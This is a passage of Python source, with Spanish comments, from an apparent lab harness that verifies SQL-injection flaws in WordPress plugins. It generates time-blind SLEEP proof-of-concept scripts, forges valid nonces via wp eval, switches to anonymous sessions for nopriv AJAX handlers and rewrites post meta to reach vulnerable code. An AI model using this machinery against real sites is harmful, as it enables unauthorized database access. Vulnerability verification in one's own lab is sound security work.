                    f"    s=socket.create_connection(('TARGET', 80), timeout=30)\n"
                    f"    t0=time.time()\n"
                    f"    s.sendall(f'GET {{path}} HTTP/1.1\\r\\nHost: TARGET\\r\\nConnection: close\\r\\n\\r\\n'.encode('latin-1'))\n"
                    f"    s.recv(65536); s.close()\n"
                    f"    return time.time()-t0\n"
                    f"print('SLEEP(0):', probe({_uri_win['fast']!r}))\n"
                    f"print('SLEEP(5):', probe({_uri_poc_path!r}))\n"
                    f"\""
                )
            else:
                res.failure_trace.append({
                    "attempt_n": 0, "technique": "request-uri-time-blind",
                    "causa": "sin_retraso",
                    "detail": f"ninguno de {len(_uri_pairs)} pares mostro retraso >= 3.5s",
                    "timing": _uri_timing_tried,
                })
                step(f"REQUEST_URI time-blind FALLO: {len(_uri_pairs)} pares sin retraso")
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
            return res

        # WordPress query vars que se inyectan directamente en WP_Query: si el parametro de ataque
        # es uno de estos vars, el ataque DEBE ir contra la raiz real (/?name=... etc.), NO contra
        # la pagina del shortcode. La pagina del shortcode existe solo para que el plugin muestre
        # su interfaz -- un parametro WP nativo (name, p, cat, tag, s, author...) se procesa en
        # WP_Query independientemente de que pagina se visite, pero el diferencial booleano
        # (200 con el post real vs 404 sin el post) solo funciona en la raiz.
        _WP_NATIVE_QUERY_VARS = {
            "name", "p", "page_id", "pagename", "cat", "tag", "s", "author",
            "author_name", "feed", "tb", "paged", "comments_popup", "m", "year",
            "monthnum", "day", "hour", "minute", "second", "post_type",
        }
        _attack_uses_wp_query_var = bool(
            isinstance(parameters, dict)
            and _WP_NATIVE_QUERY_VARS & set(parameters.keys())
        )
        if boot.shortcode_page_path and attack_endpoint_is_bare_root and not _attack_uses_wp_query_var:
            # solo se REDIRIGE el ataque a la pagina del shortcode cuando el endpoint dado era la
            # raiz (no hay otro sitio al que atacar). Si ya se dio un endpoint real y concreto
            # (p.ej. una accion AJAX propia del plugin), la pagina del shortcode existe solo para
            # que _auto_resolve_wp_blockers rasque de ahi el nonce real -- el ataque sigue yendo
            # contra el endpoint original, nunca contra la pagina.
            # EXCEPCION: si el parametro de ataque es un query var nativo de WP (name, p, cat...),
            # el diferencial boolean depende de la respuesta REAL de WP_Query en la raiz -- no
            # redirigir, ya que la pagina del shortcode responde siempre igual.
            step(f"endpoint='/' no muestra nada del plugin -- atacando en su lugar la pagina "
                 f"real creada con el shortcode ({boot.shortcode_page_path})...")
            endpoint = boot.shortcode_page_path
            res.evidence["endpoint_shortcode_page"] = endpoint

        # AJAX WordPress siempre usa POST: si el caller no lo especifico pero el endpoint es
        # admin-ajax.php, el default correcto es POST (los handlers leen $_POST, no $_GET).
        _ep_lower = (endpoint or "").lower()
        m = (http_method or ("POST" if "admin-ajax.php" in _ep_lower else "GET")).upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")

        # Extraer params del query string del endpoint (ej. /?mobile=1&code=x → mobile='1' en base_params)
        # Si el param ya está en base_params (el LLM lo extrajo), no se sobreescribe.
        if "?" in (endpoint or ""):
            from urllib.parse import urlparse as _up_sqli, parse_qs as _pqs_sqli
            _sqli_ep_parsed = _up_sqli(endpoint)
            _sqli_qs_params = _pqs_sqli(_sqli_ep_parsed.query, keep_blank_values=True)
            for _qk, _qv in _sqli_qs_params.items():
                if _qk not in base_params:
                    base_params[_qk] = _qv[0] if _qv else ""
            endpoint = _sqli_ep_parsed.path
            if _sqli_qs_params:
                step(f"QS normalizacion SQLi: extraido {list(_sqli_qs_params.keys())} de endpoint, "
                     f"endpoint limpio → '{endpoint}'")
                # Si el sqli_param fue elegido solo por fallback (primer param de la lista LLM,
                # sin match de hints), intentar de nuevo ahora que base_params tiene los params
                # reales del PoC (p.ej. orderby, sorting) que podrian coincidir con los hints.
                if not _sqli_param_from_hints:
                    _repick = _pick_param(base_params, _SQLI_HINTS)
                    if _repick and _repick != sqli_param:
                        step(f"sqli_param corregido '{sqli_param}' → '{_repick}' (hints matchean "
                             f"param del QS del endpoint PoC, no el param LLM original)")
                        sqli_param = _repick

        # Endpoint pre-check: probe ligero ANTES de _auto_resolve_wp_blockers y de las
        # técnicas de ataque. Una petición GET sin inyección al endpoint base sirve para
        # descartar rápidamente casos obvios: 404 (el recurso no existe), 302 permanente a
        # /wp-login.php (auth gate absoluto), o respuesta completamente vacía para cualquier
        # valor del parámetro (el handler existe pero no procesa ese param).
        # Se limita a ~5s y nunca bloquea el flujo: si el probe falla por timeout o error
        # de red, se ignora y la verificación continúa normalmente.
        try:
            import requests as _rq_probe
            _probe_url = boot.base_url + (endpoint if endpoint.startswith("/") else "/" + endpoint)
            _probe_sess = boot.sub_sess or _rq_probe.Session()
            _probe_p = dict(base_params)
            _probe_p[sqli_param] = "1"  # valor neutro, sin payload
            # Bug fix: use the correct HTTP method — AJAX POST endpoints return 400 on GET
            if m == "POST":
                _probe_resp = _probe_sess.post(
                    _probe_url, data=_probe_p, allow_redirects=False,
                    timeout=5, verify=False)
            else:
                _probe_resp = _probe_sess.get(
                    _probe_url, params=_probe_p, allow_redirects=False,
                    timeout=5, verify=False)
            _probe_status = _probe_resp.status_code
            _probe_loc = _probe_resp.headers.get("Location", "")
            if _probe_status == 404:
                step(f"pre-check endpoint: HTTP 404 — '{endpoint}' no existe en este lab; "
                     f"escaneando código fuente del plugin para rutas alternativas...")
                res.evidence["precheck_endpoint_status"] = 404
                res.evidence["precheck_nota"] = "endpoint devolvio 404 — ruta incorrecta o plugin no expone ese endpoint"
                # If endpoint looks like a bare WP REST path (missing /wp-json/ prefix), try it
                if not endpoint.startswith("/wp-json/") and not endpoint.startswith("/wp-admin/"):
                    _wp_json_ep = "/wp-json" + endpoint
                    try:
                        _wj_params = dict(base_params)
                        _wj_params[sqli_param] = "1"
                        if m == "POST":
                            _wj_resp = _probe_sess.post(
                                boot.base_url + _wp_json_ep, data=_wj_params,
                                allow_redirects=False, timeout=5, verify=False)
                        else:
                            _wj_resp = _probe_sess.get(
                                boot.base_url + _wp_json_ep, params=_wj_params,
                                allow_redirects=False, timeout=5, verify=False)
                        if _wj_resp.status_code != 404:
                            step(f"pre-check: endpoint sin /wp-json/ — añadido prefijo, "
                                 f"responde HTTP {_wj_resp.status_code} → usando {_wp_json_ep}")
                            endpoint = _wp_json_ep
                    except Exception:
                        pass
                # If /wp-json/ pretty URL returns 404, try ?rest_route= fallback.
                # This handles labs where Apache mod_rewrite isn't routing the pretty URL
                # correctly to WordPress but plain query-string REST routes still work.
                if endpoint.startswith("/wp-json/"):
                    _rest_route_path = endpoint[len("/wp-json"):]  # /wphb/v1/rooms/search-rooms
                    _rr_ep = "/"
                    _rr_params = dict(base_params)
                    _rr_params["rest_route"] = _rest_route_path
                    _rr_params[sqli_param] = "1"
                    try:
                        if m == "POST":
                            _rr_resp = _probe_sess.post(
                                boot.base_url + _rr_ep, data=_rr_params,
                                allow_redirects=False, timeout=5, verify=False)
                        else:
                            _rr_resp = _probe_sess.get(
                                boot.base_url + _rr_ep, params=_rr_params,
                                allow_redirects=False, timeout=5, verify=False)
                        if _rr_resp.status_code not in (404, 400):
                            step(f"pre-check: /wp-json/ devolvio 404 pero ?rest_route= "
                                 f"responde HTTP {_rr_resp.status_code} "
                                 f"({len(_rr_resp.content)}B) → usando ?rest_route= en vez "
                                 f"de la ruta pretty (mod_rewrite probablemente no activo)")
                            endpoint = _rr_ep
                            base_params["rest_route"] = _rest_route_path
                            res.evidence["rest_route_fallback"] = True
                    except Exception:
                        pass
                # Auto-discover REST routes and AJAX hooks from plugin PHP code
                if plugin_source_dir:
                    _alt_routes = _scan_rest_routes(plugin_source_dir)
                    if _alt_routes:
                        step(f"rutas candidatas encontradas en source: {_alt_routes[:5]}")
                        res.evidence["alt_endpoints_discovered"] = _alt_routes
                        # Probe each candidate and switch to the first one that responds 200
                        for _alt_ep in _alt_routes:
                            try:
                                _ap = _alt_ep.split("?")[0]
                                _ap_params = {}
                                if "?" in _alt_ep:
                                    for _kv in _alt_ep.split("?", 1)[1].split("&"):
                                        if "=" in _kv:
                                            _k, _v = _kv.split("=", 1)
                                            _ap_params[_k] = _v
                                _ap_params[sqli_param] = "1"
                                _ar = _probe_sess.get(
                                    boot.base_url + _ap, params=_ap_params,
                                    allow_redirects=False, timeout=5, verify=False)
                                if _ar.status_code == 200 and len(_ar.content) > 5:
                                    step(f"pre-check: ruta alternativa '{_ap}' responde "
                                         f"HTTP {_ar.status_code} ({len(_ar.content)}B) → "
                                         f"usando como nuevo endpoint")
                                    endpoint = _ap
                                    if _ap_params:
                                        base_params = {**base_params, **{
                                            k: v for k, v in _ap_params.items()
                                            if k != sqli_param}}
                                    res.evidence["endpoint_autodiscovered"] = _ap
                                    break
                            except Exception:
                                continue
                    else:
                        step("no se hallaron rutas REST ni hooks AJAX en el source del plugin")
            elif _probe_status in (301, 302) and "wp-login" in _probe_loc.lower():
                step(f"pre-check endpoint: redireccion a login ({_probe_loc}) — "
                     f"el endpoint requiere autenticación que el lab no ha resuelto")
                res.evidence["precheck_endpoint_status"] = _probe_status
                res.evidence["precheck_nota"] = f"auth gate: redirige a {_probe_loc}"
            elif len(_probe_resp.content) < 10 and _probe_status == 200:
                step(f"pre-check endpoint: respuesta vacía (200, {len(_probe_resp.content)}B) — "
                     f"el handler existe pero no procesa '{sqli_param}' o falta seed data")
                res.evidence["precheck_endpoint_status"] = 200
                res.evidence["precheck_nota"] = "respuesta control vacia — revisar seed data y sqli_param"
            else:
                step(f"pre-check endpoint: HTTP {_probe_status}, "
                     f"{len(_probe_resp.content)}B — endpoint accesible")
                res.evidence["precheck_endpoint_status"] = _probe_status
        except Exception as _probe_exc:
            step(f"pre-check endpoint: error/timeout ({_probe_exc!r:.60}) — continuando")

        # bloqueos de infraestructura comunes a CUALQUIER tecnica contra WordPress (nonce/token
        # sin resolver, ID de recurso ofuscado) -- ver _auto_resolve_wp_blockers, factorizado
        # para que todos los verify_* dinamicos lo compartan en vez de duplicar esta logica.
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, sqli_param, res, step,
            extra_nonce_pages=extra_nonce_pages,
            plugin_source_dir=plugin_source_dir)

        _raw_orig = str(base_params.get(sqli_param) or "1")
        # Cuando el PoC mete el payload completo en el valor del param (p.ej. mailplus:
        # orderby="sent_time,(select*from...)"), limpiar la parte de inyeccion para que el
        # valor de control sea solo el nombre de columna/valor real.
        _sql_injection_re = re.compile(
            r",\s*\(?\s*(select|union|extractvalue|updatexml|sleep|case\s+when)",
            re.IGNORECASE)
        _inj_match = _sql_injection_re.search(_raw_orig)
        orig_value = _raw_orig[:_inj_match.start()].strip() if _inj_match else _raw_orig

        # Fallback: si orig_value es el default '1' y sqli_param no tiene valor en base_params,
        # intentar extraer el valor real desde un segmento del path del endpoint.
        # Cubre path-params estilo REST como /rsvpmailer_member/test@example.com (email),
        # /items/123 (ID numerico), etc. — sin hardcodear nada especifico.
        import urllib.parse as _urlparse
        _email_param_hints = {"email", "sender", "receiver", "mail", "user", "address"}
        _is_email_param = any(h in sqli_param.lower() for h in _email_param_hints)
        # Segmentos del endpoint que NUNCA son orig_value válido:
        # ficheros PHP de WP (admin-ajax.php, wp-login.php, etc.), directorios WP conocidos,
        # prefijos de versión REST (v1, v2…).
        _WP_PATH_BLOCKLIST = {
            "admin-ajax.php", "wp-login.php", "wp-cron.php", "xmlrpc.php",
            "wp-admin", "wp-includes", "wp-content", "wp-json",
        }
        if orig_value == "1" and (not base_params.get(sqli_param)
                                   or base_params.get(sqli_param) == "1"):
            for _seg in reversed([_urlparse.unquote(s) for s in endpoint.split("/") if s]):
                # Nunca extraer segmentos conocidos de la infraestructura WP
                if _seg.lower() in _WP_PATH_BLOCKLIST:
                    continue
                if ("@" in _seg or                                           # email con @
                        re.match(r"^\d+$", _seg) or                         # ID numerico
                        ("." in _seg and len(_seg) >= 5                      # dominio/token con punto
                         and not _seg.lower().endswith(".php")               # no ficheros PHP
                         and not re.match(r"^v\d+", _seg, re.I))):          # no 'v1', 'v2', etc.
                    _extracted = _urlparse.unquote(_seg)
                    # Si el segmento no tiene @, puede que el LLM haya mangleado @ → _
                    # para hacer la URL valida. Restaurar con o sin _is_email_param:
                    # algunos endpoints tienen gates de email aunque sqli_param se llame 'q' u otro
                    # (el LLM refina mal el nombre del param pero la URL sigue siendo path de email).
                    if "@" not in _extracted and "_" in _extracted:
                        _cand = _extracted.replace("_", "@", 1)
                        if re.match(r"[^@]+@[^@]+\.[^@]{2,6}$", _cand):
                            endpoint = endpoint.replace(_extracted, _cand, 1)
                            _extracted = _cand
                            step(f"email restaurado en endpoint: '{_extracted}' "
                                 f"(LLM mangleaba @ → _ para URL valida, restaurado para gates email)")
                    orig_value = _extracted
                    step(f"orig_value extraido del path del endpoint: '{orig_value}' "
                         f"('{sqli_param}' no estaba en base_params, posible path-param)")
                    break

        # Restauracion de email mangleado cuando el LLM asigna @ → _ en base_params
        # (caso: sqli_param='q', base_params={'q':'test_example.com'}, path-extraction no corrio).
        # Sin @ el gate rsvpmail_contains_email() rechaza el valor y la SQL nunca corre.
        if "@" not in orig_value and "_" in orig_value and orig_value in endpoint:
            _cand_em = orig_value.replace("_", "@", 1)
            if re.match(r"[^@]+@[^@]+\.[^@]{2,6}$", _cand_em):
                endpoint = endpoint.replace(orig_value, _cand_em, 1)
                if base_params.get(sqli_param) == orig_value:
                    base_params[sqli_param] = _cand_em
                orig_value = _cand_em
                step(f"email restaurado en orig_value/endpoint: '{orig_value}' "
                     f"(LLM mangleaba @ → _ aunque sqli_param='{sqli_param}')")

        # Si orig_value queda vacio o solo espacios despues de stripping, usar fallbacks
        # semanticos segun el nombre del parametro para que los payloads tengan valor base valido.
        # Sin esto, " AND SLEEP(5)-- -" nunca evalúa la condicion SQL porque no hay valor precedente.
        if not orig_value or not orig_value.strip():
            _param_lower = sqli_param.lower()
            if any(k in _param_lower for k in ("id", "post", "page", "num", "count", "order", "sort")):
                orig_value = "1"
            elif any(k in _param_lower for k in ("email", "mail", "user", "login", "name")):
                orig_value = "test@example.com"
            elif any(k in _param_lower for k in ("slug", "key", "token", "code", "search", "query", "q")):
                orig_value = "test"
            else:
                orig_value = "1"
            step(f"orig_value vacio — usando fallback '{orig_value}' para parametro '{sqli_param}' "
                 f"(sin valor base, los payloads SLEEP/AND no evaluan la condicion SQL)")

        # algunos plugins (ver _SQLI_CUSTOM_SORT_GATE) gatean el sumidero real detras de una
        # comparacion EXACTA contra un valor guardado en META de un post real -- sin esto, se
        # puede probar el payload correcto contra el parametro correcto y nunca confirmarse,
        # porque el codigo vulnerable ni se ejecuta. Como el laboratorio es propio, se recupera
        # el ID real del recurso (a partir del hash ya resuelto) y se sincroniza esa meta con
        # CADA valor que se prueba, justo antes de enviarlo -- abriendo la puerta uno mismo.
        gate = _SQLI_CUSTOM_SORT_GATE.get(slug)
        gate_post_id = None
        if gate and gate["directory_id_param"] in base_params:
            gate_post_id = _reverse_hashed_resource_id(str(base_params[gate["directory_id_param"]]))
            if gate_post_id is not None:
                step(f"'{slug}' gatea el sumidero real detras de una comparacion exacta contra "
                     f"'{gate['meta_key']}' del recurso real (post {gate_post_id}) -- se "
                     f"sincronizara esa meta con cada valor probado antes de enviarlo")

        # Detect whether the endpoint is unauthenticated by scanning the installed plugin source
        # for add_action('wp_ajax_nopriv_ACTION', ...). No hardcoded list — works for any plugin.
        # When nopriv: some plugins (e.g. Ultimate Member) have capability guards that short-circuit
        # for logged-in users without the right cap, so the attack must be sent anonymously.
        import requests as _requests_mod
        # Bug fix: search for action in base_params first (QS normalization strips it from endpoint)
        _action_name = str(base_params.get("action", "")).strip()
        if not _action_name:
            _action_m = re.search(r"[?&]action=(\w+)", endpoint or "")
            _action_name = _action_m.group(1) if _action_m else ""
        _anon_attack = bool(_action_name and _detect_nopriv_from_source(plugin_source_dir, _action_name))
        if _anon_attack:
            step(f"fuente del plugin detecta wp_ajax_nopriv_{_action_name} → ataque anonimo (sin sesion de usuario)")
        _attack_sess = boot.sub_sess
        if _anon_attack:
            _attack_sess = _requests_mod.Session()
            _attack_sess.headers.update({"User-Agent": "Mozilla/5.0 binoracle-lab"})
        # X-WP-Nonce injection for WP REST API endpoints (/wp-json/): REST endpoints
        # check rest_cookie_check_errors which requires a valid X-WP-Nonce header.
        # For authenticated attacks: generate as the subscriber (sub_user) so the nonce
        # is valid for that user's session. For anonymous attacks: skip (public REST routes
        # don't require a nonce; nonce injection would only fail silently).
        if (endpoint or "").startswith("/wp-json/") and lab is not None and not _anon_attack:
            _sub_id_raw = lab.exec_mysql(
                f"SELECT ID FROM wp_users WHERE user_login='{boot.sub_user}' LIMIT 1;",
                boot.db_pw) or ""
            _sub_id = _sub_id_raw.strip().split("\n")[-1].strip()
            if _sub_id.isdigit():
                _eval_nonce = (f"wp_set_current_user({_sub_id}); "
                               f"echo wp_create_nonce('wp_rest');")
            else:
                _eval_nonce = "echo wp_create_nonce('wp_rest');"
            _r_rest_nonce = lab.wp_cli("eval", _eval_nonce, timeout=10)
            _rest_nonce = (_r_rest_nonce.stdout or "").strip().split("\n")[-1].strip()
            if len(_rest_nonce) >= 8:
                _attack_sess.headers["X-WP-Nonce"] = _rest_nonce
                step(f"X-WP-Nonce generado para endpoint REST (user={_sub_id}): {_rest_nonce[:10]}...")
        # For ANY anonymous attack with nonce-like params: generate a correct nonce via
        # wp eval (user_id=0) so the endpoint receives the action-specific nonce, not a
        # generic page-scraped one. This applies to admin-ajax.php (e.g. Ultimate Member,
        # CVE-2024-1071) AND /wp-json/ endpoints — page scraping returns the wrong nonce
        # when the action uses a plugin-specific nonce action like 'um-frontend-nonce'.
        if _anon_attack and lab is not None:
            _anon_nonce_keys = [nk for nk in base_params
                                if any(h in nk.lower() for h in ("nonce", "security", "token"))]
            _anon_wp_eval_done = False
            # Fast-path: if the caller provided the exact nonce action, skip detection.
            if _anon_nonce_keys and nonce_action:
                _r_known = lab.wp_cli("eval",
                    f"wp_set_current_user(0);echo wp_create_nonce('{nonce_action}');",
                    timeout=10)
                _known_nonce = (_r_known.stdout or "").strip()
                if _known_nonce and len(_known_nonce) >= 10:
                    for _nk in _anon_nonce_keys:
                        base_params[_nk] = _known_nonce
                    step(f"nonce anonimo generado con nonce_action especificado "
                         f"'{nonce_action}' → {_known_nonce[:8]}... "
                         f"(saltando deteccion automatica)")
                    res.evidence["nonce_anonimo_via_eval"] = {
                        "action": nonce_action, "value": _known_nonce, "source": "explicit"}
                    _anon_wp_eval_done = True
            if _anon_nonce_keys and not _anon_wp_eval_done:
                # Two-pass: first find the wp_verify_nonce action in the files that
                # register wp_ajax_nopriv_ACTION (the actual callback files), then fall
                # back to global scan. This avoids picking up nonce actions from unrelated
                # handlers that happen to appear first in directory order.
                # Three-pass nonce action detection:
                # 1. Find files registering wp_ajax_nopriv_ACTION → extract callback method name
                # 2. Find files that define that method AND have check_ajax_referer/wp_verify_nonce
                # 3. Global scan fallback, preferring files with the action word in their name
                # This handles the common pattern where registration file ≠ callback class file.
                _eval_find_action = (
                    f"$slug='{slug}';"
                    f"$nopriv_action='{_action_name}';"
                    r"$dir=WP_PLUGIN_DIR.'/'.$slug.'/';"
                    r"$nonce_action='';"
                    r"$nonce_extract='/(?:wp_verify_nonce\s*\(\s*\$\w+\s*,|check_ajax_referer\s*\()\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
                    r"$cb_re='/add_action\s*\([^\)]*nopriv_'.preg_quote($nopriv_action,'/').'[^\)]*,\s*[\[\(]?[^\]\),]+,\s*[\x27\x22](\w+)[\x27\x22]/is';"
                    r"try{$it=new RecursiveIteratorIterator("
                    r"new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));"
                    r"$reg_files=[];$all_php=[];"
                    r"foreach($it as $f){"
                    r"if($f->getExtension()!=='php')continue;"
                    r"$c=@file_get_contents($f->getPathname());"
                    r"if(!$c)continue;"
                    r"$all_php[$f->getPathname()]=$c;"
                    r"if(strpos($c,'wp_ajax_nopriv_'.$nopriv_action)!==false)$reg_files[$f->getPathname()]=$c;"
                    r"}"
                    # Pass 0.5: proximity search — find check_ajax_referer NEAR the action keyword
                    # (within 3000 chars). This handles plugins that register actions dynamically
                    # so no literal 'wp_ajax_nopriv_ACTION' exists, AND avoids false positives
                    # from unrelated files that happen to contain both keywords far apart.
                    # For um_get_members: 'get_members' is in the function body of ajax_get_members
                    # right next to check_ajax_referer('um-frontend-nonce') in class-member-
                    # directory-meta.php, while settings files don't have 'get_members' anywhere.
                    r"if(!$nonce_action){"
                    r"$aparts2=array_values(array_filter(explode('_',$nopriv_action),function($p){return strlen($p)>3;}));"
                    r"$kw2=implode('_',array_slice($aparts2,-2));$win=3000;"
                    r"if(!$kw2)$kw2=$nopriv_action;"
                    r"foreach($all_php as $fp=>$fc){"
                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
                    r"$pos=0;"
                    r"while(($kpos=stripos($fc,$kw2,$pos))!==false){"
                    r"$seg=substr($fc,max(0,$kpos-$win),min(strlen($fc),$kpos+$win)-max(0,$kpos-$win));"
                    r"if(preg_match($nonce_extract,$seg,$m)){$nonce_action=$m[1];break 2;}"
                    r"$pos=$kpos+1;"
                    r"}}}"
                    # Pass 1: check registration files directly
                    r"foreach($reg_files as $rp=>$rc){"
                    r"if(preg_match($nonce_extract,$rc,$m)){$nonce_action=$m[1];break;}"
                    r"}"
                    # Pass 2: extract callback method name from registration, find defining file
                    r"if(!$nonce_action){"
                    r"$cb_method='';"
                    r"foreach($reg_files as $rp=>$rc){"
                    r"if(preg_match($cb_re,$rc,$m)){$cb_method=$m[1];break;}"
                    r"}"
                    r"if($cb_method){"
                    r"foreach($all_php as $fp=>$fc){"
                    r"if(strpos($fc,'function '.$cb_method)===false)continue;"
                    r"if(preg_match($nonce_extract,$fc,$m)){$nonce_action=$m[1];break;}"
                    r"}}}"
                    # Pass 2.5: files that contain a significant part of the action name (>3 chars)
                    # AND a nonce check -- handles plugins that register actions dynamically
                    # so no literal 'wp_ajax_nopriv_ACTION' string exists in any file.
                    # E.g. UM registers via apply_filters, so $reg_files is empty; but the
                    # handler file (class-ajax-common.php) contains 'members' (from the method
                    # name ajax_get_members) AND check_ajax_referer('um-frontend-nonce').
                    r"if(!$nonce_action){"
                    r"$aparts=array_filter(explode('_',$nopriv_action),function($p){return strlen($p)>3;});"
                    r"if($aparts){"
                    r"foreach($all_php as $fp=>$fc){"
                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
                    r"if(!preg_match($nonce_extract,$fc,$m))continue;"
                    r"$has_part=false;"
                    r"foreach($aparts as $ap){if(stripos($fc,$ap)!==false){$has_part=true;break;}}"
                    r"if($has_part){$nonce_action=$m[1];break;}"
                    r"}}}"
                    # Pass 2.7: wp_create_nonce in frontend JS-localization files.
                    # Handles plugins that pass the nonce to JS via wp_localize_script,
                    # e.g. UM's class-enqueue.php:
                    #   wp_localize_script('um_scripts', 'um', [
                    #     'nonce' => wp_create_nonce('um-frontend-nonce'), ...
                    #   ]);
                    # nonce_extract never matches these (they use wp_create_nonce, not
                    # check_ajax_referer/wp_verify_nonce with a literal action).
                    # Strategy: find non-admin files that have BOTH wp_localize_script
                    # AND wp_create_nonce('literal'), prefer files in a 'frontend' dir.
                    r"if(!$nonce_action){"
                    r"$create_re='/wp_create_nonce\s*\(\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
                    r"$loc_prio=[];$loc_rest=[];"
                    r"foreach($all_php as $fp=>$fc){"
                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
                    r"if(stripos($fc,'wp_localize_script')===false)continue;"
                    r"if(!preg_match($create_re,$fc,$m))continue;"
                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'frontend'.DIRECTORY_SEPARATOR)!==false)$loc_prio[]=$m[1];"
                    r"else $loc_rest[]=$m[1];"
                    r"}"
                    r"if($loc_prio)$nonce_action=$loc_prio[0];"
                    r"elseif($loc_rest)$nonce_action=$loc_rest[0];"
                    r"}"
                    # Pass 2.8: indirect wp_verify_nonce — variable action with ternary default.
                    # For plugins that wrap the nonce check in a helper method:
                    #   function check_ajax_nonce($action=false){
                    #     $action = empty($action) ? 'nonce-action' : $action;
                    #     wp_verify_nonce($nonce, $action);
                    #   }
                    r"if(!$nonce_action){"
                    r"$indirect_re='/wp_verify_nonce\s*\(\s*\$\w+\s*,\s*\$\w+/is';"
                    r"$ternary_re='/empty\s*\([^\)]+\)\s*\?\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
                    r"foreach($all_php as $fp=>$fc){"
                    r"if(stripos($fp,DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR)!==false)continue;"
                    r"if(preg_match($indirect_re,$fc)&&preg_match($ternary_re,$fc,$m)){$nonce_action=$m[1];break;}"
                    r"}}"
                    # Pass 3: global scan - prefer files whose name contains action keyword
                    r"if(!$nonce_action){"
                    r"$kw=str_replace('_','-',$nopriv_action);"
                    r"$prio=[];$rest=[];"
                    r"foreach($all_php as $fp=>$fc){"
                    r"if(strpos(strtolower(basename($fp)),$kw)!==false||strpos(strtolower(basename($fp)),str_replace('-','_',$kw))!==false)$prio[$fp]=$fc;"
                    r"else $rest[$fp]=$fc;"
                    r"}"
                    r"foreach(array_merge($prio,$rest) as $fp=>$fc){"
                    r"if(preg_match($nonce_extract,$fc,$m)){$nonce_action=$m[1];break;}"
                    r"}}"
                    r"}catch(Exception $e){}"
                    r"echo $nonce_action;"
                )
                r_act = lab.wp_cli("eval", _eval_find_action, timeout=15)
                _nonce_act = (r_act.stdout or "").strip()
                # Sanity-check: a nopriv (unauthenticated) endpoint's nonce action
                # should NOT be from the admin/settings area. If the scan landed on a
                # settings or admin file (happens when passes 1+2 fail and pass 2.5/3
                # find an unrelated file first), the generated nonce will always fail
                # check_ajax_referer for the frontend endpoint. Drop it and fall
                # through to the fallback scraping which re-scrapes from the actual
                # published page with the anonymous session.
                _admin_nonce_words = {"settings", "admin", "config", "options",
                                      "dashboard", "panel", "backend"}
                if _nonce_act and any(w in _nonce_act.lower()
                                      for w in _admin_nonce_words):
                    step(f"nonce action '{_nonce_act}' descartado (parece area admin, "
                         f"no frontend) -- usando fallback scraping anonimo en su lugar")
                    _nonce_act = ""
                if _nonce_act:
                    r_gen = lab.wp_cli("eval",
                        f"wp_set_current_user(0);echo wp_create_nonce('{_nonce_act}');",
                        timeout=10)
                    _gen = (r_gen.stdout or "").strip()
                    if _gen and len(_gen) >= 10:
                        for nk in _anon_nonce_keys:
                            base_params[nk] = _gen
                        step(f"nonce anonimo (user_id=0) generado via wp eval "
                             f"(accion='{_nonce_act}') -- sobreescribe nonce scraped para "
                             f"sesion anonima")
                        res.evidence["nonce_anonimo_via_eval"] = {
                            "action": _nonce_act, "value": _gen}
                        _anon_wp_eval_done = True
            if not _anon_wp_eval_done:
                # Fallback: re-scrape anonymously from published pages
                _anon_nonce_pages = list(extra_nonce_pages or [])
                if boot.shortcode_page_path and boot.shortcode_page_path not in _anon_nonce_pages:
                    _anon_nonce_pages.insert(0, boot.shortcode_page_path)
                if not _anon_nonce_pages:
                    _anon_nonce_pages = ["/"]
                for _np in _anon_nonce_pages:
                    try:
                        _nr = _attack_sess.get(boot.base_url + _np, timeout=15)
                        _anon_nonce_m = re.search(
                            r'(?:nonce|security)["\']?\s*[:=]\s*["\']([a-f0-9]{8,16})["\']',
                            _nr.text or "", re.I)
                        if _anon_nonce_m:
                            for nk in list(base_params.keys()):
                                if any(h in nk.lower() for h in ("nonce", "security", "token")):
                                    base_params[nk] = _anon_nonce_m.group(1)
                                    break
                            step(f"nonce anonimo raspado de '{_np}' (fallback)")
                            break
                    except Exception:
                        pass

        # Detectar inyeccion en PATH: si el valor del param aparece en el endpoint mismo
        # (ej. /wp-json/plugin/v1/member/test@example.com, sqli_param='email'),
        # la inyeccion va en el segmento del path, no en query string/body.
        _path_inject = (orig_value and len(orig_value) >= 3 and
                        orig_value in endpoint and
                        orig_value != "1")  # '1' aparece en demasiados paths
        if _path_inject:
            step(f"inyeccion en PATH detectada: '{orig_value}' aparece en el endpoint "
                 f"-- se reemplazara en el path en cada payload (no query param)")

        def send(val):
            if gate_post_id is not None:
                lab.wp_cli("post", "meta", "update", str(gate_post_id), gate["meta_key"], val,
                          timeout=15)
            if _path_inject:
                _inject_ep = endpoint.replace(orig_value, val, 1)
                return _attack_sess.request(m, boot.base_url + _inject_ep,
                                   data={k: v for k, v in base_params.items() if k != sqli_param}
                                        if m != "GET" else None,
                                   params={k: v for k, v in base_params.items() if k != sqli_param}
                                        if m == "GET" else None, timeout=20)
            payload = dict(base_params)
            payload[sqli_param] = val
            return _attack_sess.request(m, boot.base_url + endpoint,
                               json=payload if (m != "GET" and json_body) else None,
                               data=payload if (m != "GET" and not json_body) else None,
                               params=payload if m == "GET" else None, timeout=20)

        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                             "login_bajo_privilegio_password": boot.sub_pass,
                             "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint})

        step("peticion de control (sin inyeccion)...")
        try:
            base_resp = send(orig_value)
        except Exception as e:
            res.detail = f"la peticion de control fallo: {e}"
            return res
        # HTTP method rotation: if control returned 405 (Method Not Allowed), flip GET↔POST
        # and rebuild the send() closure with the corrected method.
        if getattr(base_resp, "status_code", None) == 405:
            _alt_method = "GET" if m == "POST" else "POST"
            step(f"control devolvio 405 con {m} -- reintentando con {_alt_method}...")
            m = _alt_method
